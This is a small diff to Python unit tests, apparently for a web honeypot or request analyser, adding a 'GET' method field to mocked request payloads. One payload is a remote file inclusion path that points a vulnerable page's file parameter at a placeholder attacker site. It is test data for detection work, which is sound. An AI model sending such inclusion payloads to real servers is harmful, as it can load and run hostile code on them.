@@ -60,7 +60,7 @@ class TestServer(unittest.TestCase):
 
                 @asyncio.coroutine
                 def foobar():
-                    return b'{"path":"/vuln_page.php?file=http://attacker_site/malicous_page"}'
+                    return b'{"method":"GET","path":"/vuln_page.php?file=http://attacker_site/malicous_page"}'
 
                 payload = mock.Mock()
                 payload.read = foobar
@@ -90,7 +90,7 @@ class TestServer(unittest.TestCase):
 
                 @asyncio.coroutine
                 def foobar():
-                    return b'{"path":"/index.html"}'
+                    return b'{"method":"GET","path":"/index.html"}'
 
                 payload = mock.Mock()
                 payload.read = foobar
